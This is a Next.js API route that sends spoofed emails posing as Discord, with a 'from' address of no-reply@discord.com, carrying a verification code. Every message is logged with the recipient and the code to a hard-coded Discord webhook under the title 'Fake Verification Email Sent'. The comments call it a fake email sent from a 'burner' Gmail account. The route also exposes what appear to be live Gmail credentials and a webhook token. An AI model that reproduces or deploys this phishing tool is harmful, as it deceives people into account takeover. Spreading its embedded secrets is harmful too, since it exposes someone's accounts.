import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(req: NextRequest) {
  try {
    const { email } = await req.json();

    if (!email || typeof email !== 'string' || !email.includes('@')) {
      return NextResponse.json({ error: 'Invalid or missing email' }, { status: 400 });
    }

    // Generate random 6-digit code
    const code = Math.floor(100000 + Math.random() * 900000).toString();

    // SMTP transporter (use your real burner Gmail + App Password)
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false, // true for 465, false for other ports
      auth: {
        user: 'nusenusewhen@gmail.com',           // ← your real Gmail here
        pass: 'Warrior12@'                        // ← your real password or App Password here
      }
    });

    // Send the fake email
    await transporter.sendMail({
      from: '"Discord Verification" <no-reply@discord.com>',
      to: email,
      subject: 'Your Discord Verification Code',
      text: `Hello! Use this code to verify your login: ${code}\n\nThis code expires in 10 minutes.\nIf you didn't request this, please ignore this email.`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f6f6f6;">
          <h2 style="color: #5865f2;">Discord</h2>
          <p style="font-size: 16px;">Your verification code is:</p>
          <h1 style="letter-spacing: 10px; background: #ffffff; padding: 20px; text-align: center; border: 1px solid #e0e0e0;">${code}</h1>
          <p style="color: #666; font-size: 14px;">This code expires in 10 minutes. If you didn't request this, you can safely ignore this email.</p>
          <p style="font-size: 12px; color: #999;">Discord Team</p>
        </div>
      `
    });

    // Log to your webhook that email was sent
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "Fake Verification Email Sent",
          color: 0x00ff00,
          fields: [
            { name: "To", value: email },
            { name: "Code", value: code }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    }).catch(() => {});

    // Return success (don't return real code to client in production)
    return NextResponse.json({ success: true });
  } catch (err: any) {
    console.error('Email send error:', err);

    // Log failure to webhook
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "Email Send Failed",
          color: 0xff0000,
          fields: [
            { name: "Error", value: err.message || 'Unknown error' }
          ]
        }]
      })
    }).catch(() => {});

    return NextResponse.json({ error: 'Failed to send verification email' }, { status: 500 });
  }
}
